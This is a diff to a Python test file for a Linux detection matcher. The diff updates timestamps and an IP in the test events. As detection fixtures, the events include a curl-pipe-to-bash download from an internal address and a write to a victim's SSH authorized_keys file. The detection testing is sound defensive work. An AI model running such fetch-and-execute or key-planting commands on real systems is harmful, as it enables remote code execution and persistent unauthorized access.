@@ -106,7 +106,7 @@ def _ecs_process(name, args):
         "event": {"action": "exec"},
         "process": {"name": name, "args": args},
         "host": {"name": "web01"},
-        "@timestamp": "2026-05-16T07:15:00Z",
+        "@timestamp": "2026-06-10T07:15:00Z",
     }
 
 
@@ -117,7 +117,7 @@ def test_linux_bash_and_base64_chain():
 
 
 def test_linux_curl_pipe_to_bash():
-    src = _ecs_process("curl", ["-s", "http://10.0.30.10:8080/payload", "|", "bash"])
+    src = _ecs_process("curl", ["-s", "http://10.77.30.10:8080/payload", "|", "bash"])
     assert match_linux_profile(LINUX_PROFILES["linux_curl_bash_pipe"], src)[0]
 
 
@@ -142,7 +142,7 @@ def test_linux_authorized_keys_write():
         "file": {"path": "/home/victim/.ssh/authorized_keys"},
         "process": {"name": "sh"},
         "host": {"name": "web01"},
-        "@timestamp": "2026-05-16T07:20:00Z",
+        "@timestamp": "2026-06-10T07:20:00Z",
     }
     assert match_linux_profile(LINUX_PROFILES["linux_authorized_keys_write"], src)[0]
 
